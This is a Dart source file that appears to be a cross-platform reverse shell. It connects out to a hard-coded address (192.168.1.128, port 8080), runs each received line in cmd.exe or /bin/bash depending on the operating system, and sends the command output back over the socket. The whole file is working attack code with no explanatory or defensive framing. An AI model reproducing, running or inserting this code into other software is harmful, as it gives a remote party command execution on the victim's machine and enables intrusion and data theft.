import 'dart:io';
import 'dart:convert';

String results = "";

main() {
  String ip = "192.168.1.128";
  int port = 8080;
  shell(ip, port);
}

void shell(String ip, int port) async {
  Socket socket = await Socket.connect(ip, port);

  socket.listen((response) {
    String command = new String.fromCharCodes(response).trim();

    if (Platform.isWindows) {
      Process.start('cmd.exe', []).then((Process shell) {
        shell.stdin.writeln(command);
        shell.stdout.transform(utf8.decoder).listen((res) {
          socket.writeln(res);
        });
      });
    } else if (Platform.isLinux) {
      Process.start('/bin/bash', []).then((Process shell) {
        shell.stdin.writeln(command);
        shell.stdout.transform(utf8.decoder).listen((res) {
          socket.writeln(res);
        });
      });
    } else if (Platform.isMacOS) {
      Process.start('/bin/bash', []).then((Process shell) {
        shell.stdin.writeln(command);
        shell.stdout.transform(utf8.decoder).listen((res) {
          socket.writeln(res);
        });
      });
    } else {
      socket.writeln("Unsupported operating system");
    }

    if (command == "help") {
      print("add your functions");
    }
  });
}
